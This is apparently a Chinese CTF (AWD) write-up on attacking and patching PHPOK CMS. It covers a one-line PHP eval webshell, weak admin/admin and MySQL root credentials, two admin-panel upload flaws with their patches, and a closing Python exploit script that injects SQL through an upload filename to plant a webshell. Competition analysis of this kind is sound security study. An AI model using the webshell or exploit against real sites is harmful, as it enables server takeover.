# bugkuAWD-14-phpok

## 一句话木马

WEB服务打的是phpok cms, 上来通过D盾扫到一个小马

```
/var/www/html/css/images/yijuhua.php: <?php eval($_POST["test"]);?>
```

利用小马批量上传shell和不死马进行维权

后台通过账号/弱密码 admin/admin 登录, 进入后选项上可以修改密码, 或者直接在 mysql 中修改密码, 密码存储形式为 md5

```
mysql -uroot -proot
show databases;
use phpok;
show tables;
select * from qinggan_user;
update qinggan_user set pass='xxx' where id=id;
```

批量修改密码就无法进入后台了

## 后台上传漏洞

访问附件管理分类

![20210601201343198](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601201343198.png)

编辑附件分类, 添加 php

![20210601201657374](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601201657374.png)

内容管理 > 咨询中心 ![20210601201711244](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601201711244.png)

编辑文章

![20210601202201045](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601202201045.png)

选择图片![20210601202226348](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601202226348.png)

本地上传

![20210601202241996](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601202241996.png)

上传后查看文件路径

![20210601202317864](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601202317864.png)

这样就把木马传上去了, 只要拥有后台的 cookie 就可以随时使用了, 漏洞在 `/framework/admin/rescate_control.php`

```
		foreach($list_filetypes as $key=>$value){
			$value = trim($value);
			if(!$value){
				unset($list_filetypes[$key]);
				continue;
			}

            if(!preg_match("/[a-z0-9\_\.]+/",$value)){
                $this->json(P_Lang('附件类型设置不正确，仅限字母，数字及英文点符号'));
            }

		}
```

只检测了后缀是否符合标准并没有检测 php 后缀, 所以只需要在这一块禁用 php 即可

```
if(preg_match('#.+\.ph(p[3457]?|t|tml)$|/#is',$value)) {
                $this->json(P_Lang('禁止该后缀上传!'));
            }
```

## 后台升级压缩包漏洞

程序升级 > 选择本地文件 > 上传离线包升级

![20210601211005387](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210601211005387.png)

系统会自动解压在 html 目录, 访问上传的 php 文件即可, 该漏洞在 `/framework/admin/update_control.php`

```
	//解压zip
	public function unzip_f()
	{
        $zipfile = $this->get('zipfile');
		if(!$zipfile){
			$this->error(P_Lang('未指定附件文件'));
		}
		if(strpos($zipfile,'..') !== false){
			$this->error(P_Lang('不支持带..上级路径'));
		}
		if(!file_exists($this->dir_root.$zipfile)){
			$this->error(P_Lang('ZIP文件不存在'));
		}
		$this->lib('phpzip')->unzip($this->dir_root.$zipfile,'data/update/');
		$info = $this->update_load();
		if(!$info || (is_array($info) && $info['status'] == 'error')){
			$this->error($info['content']);
		}
		$this->success();
	}
```

比赛期间直接禁用该功能就好了, 不会被 check down, 在函数开头直接 die

```
die('hacker');
```

## 其余

还有一个**插件上传漏洞**, 但是比赛测试发现用官方给的插件也无法安装, 所以暂时无法利用...一直显示插件安装异常, 如果可以安装上去将会在 plugins 文件夹下得到解压的 php 文件, 访问即可

前台还有一个文件上传漏洞, 暂时没利用上, 貌似挺复杂的, 说是前台可以未注册直接上传文件(因为这个 cms 注册之后还需要管理员审核, 基本通过注册进入是不可能的), 贴一下大佬的脚本(能利用上最好)

```python
#-*- coding:utf-8 -*-
import requests
import sys
import re
if len(sys.argv) < 2:
    print u"Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02"
    exit()
baseurl = sys.argv[1]
phpses = sys.argv[2] if len(sys.argv) > 2 else ''
cookies = {'PHPSESSION': phpses}
if baseurl[-1] == '/':
    baseurl = baseurl[:-1]
url = baseurl + '/index.php?c=upload&f=save'
files = [
    ('upfile', ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f62616c69736f6e672e706870,'1495536080','2.jpg",
                '<?php phpinfo();?>', 'image/jpg')),
]
files1 = [
    ('upfile',
     ('1.jpg', '<?php phpinfo();?>', 'image/jpg')),
]
r = requests.post(url, files=files, cookies=cookies)
response = r.text
id = re.search('"id":"(\d+)"', response, re.S).group(1)
id = int(id) + 1
url = baseurl + '/index.php?c=upload&f=replace&oldid=%d' % (id)
r = requests.post(url, files=files1, cookies=cookies)
shell = baseurl + '/res/balisong.php'
response = requests.get(shell)
if response.status_code == 200:
    print "congratulation:Your shell:\n%s\npassword:balisong" % (shell)
else:
    print "oh!Maybe failed.Please check"
```



